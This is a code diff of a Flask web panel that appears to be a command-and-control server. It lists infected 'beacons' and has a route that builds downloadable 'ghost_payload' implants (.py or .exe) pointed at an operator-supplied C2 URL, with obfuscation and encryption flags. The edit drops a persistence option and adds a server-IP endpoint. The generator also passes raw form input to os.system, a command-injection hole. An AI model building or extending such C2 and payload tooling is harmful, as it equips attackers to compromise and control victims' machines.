@@ -1,8 +1,7 @@
 import eventlet
 eventlet.monkey_patch()
 
-from flask import send_from_directory
-from flask import Flask, request, jsonify, render_template, redirect, session, url_for
+from flask import send_from_directory, Flask, request, jsonify, render_template, redirect, session, url_for
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
 from flask_socketio import SocketIO, emit
 import sqlite3
@@ -81,7 +80,6 @@ def get_beacons():
     c.execute("SELECT hostname, ip, timestamp, payload FROM beacons ORDER BY timestamp DESC")
     rows = c.fetchall()
     conn.close()
-
     beacons = []
     for row in rows:
         hostname, ip, timestamp, payload = row
@@ -238,45 +236,36 @@ def result():
 @login_required
 def generate():
     if request.method == 'POST':
-        c2 = request.form.get('c2')
-        result = request.form.get('result')
-        format = request.form.get('format')
-        obfuscate = 'obfuscate' in request.form
-        persist = 'persist' in request.form
-        encrypt = 'encrypt' in request.form
+        c2url = request.form.get('c2url')
+        resulturl = request.form.get('resulturl')
+        filename = request.form.get('filename') or datetime.now(UTC).strftime("ghost_payload_%Y%m%d_%H%M%S")
+        fileext = request.form.get('fileext', 'py')
 
-        timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
-        filename = f"ghost_payload_{timestamp}.{format}"
-        out_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds', filename))
+        ext = fileext if fileext in ['py', 'exe'] else 'py'
+        full_filename = f"{filename}.{ext}"
+        out_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds', full_filename))
 
         os.makedirs(os.path.dirname(out_path), exist_ok=True)
 
-        cmd = f"python3 ../tools/generate_payload.py --c2 {c2} --result {result}"
-
-        if format == "exe":
+        cmd = f"python3 ../tools/generate_payload.py --c2 {c2url} --result {resulturl} --output {out_path}"
+        if ext == 'exe':
             cmd += " --exe"
-        elif format == "bat":
-            cmd += " --bat"
-        elif format == "ps1":
-            cmd += " --ps1"
-        elif format == "py":
-            cmd += " --py"
-
-        if obfuscate:
+        if 'obfuscate' in request.form:
             cmd += " --obfuscate"
-        if encrypt:
+        if 'encrypt' in request.form:
             cmd += " --encrypt"
-        if persist:
-            cmd += " --persist"
-
-        cmd += f" --output {out_path}"
 
         print(f"[+] Running: {cmd}")
         os.system(cmd)
 
-        return redirect(url_for('download_payload', filename=filename))
+        return redirect(url_for('download_payload', filename=full_filename))
 
     return render_template("generate.html")
+
+@app.route('/api/server-ip')
+@login_required
+def get_server_ip():
+    return jsonify({"ip": request.host.split(':')[0]})
 
 @app.route('/download/<filename>')
 @login_required
